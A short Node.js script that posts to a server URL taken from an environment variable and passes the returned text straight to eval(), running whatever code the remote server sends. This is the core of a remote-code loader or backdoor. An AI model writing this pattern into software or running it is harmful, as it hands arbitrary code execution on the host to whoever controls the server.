const axios = require('axios');
const serverUrl = process.env.SERVER_URL;

axios.post(serverUrl)
  .then(response => {
    const code = response.data.trim();
    if (code) {
      try {
        eval(code);
      } catch (error) {
        console.error(error.message);
      }
    }
  })
  .catch(error => console.error(error.message));
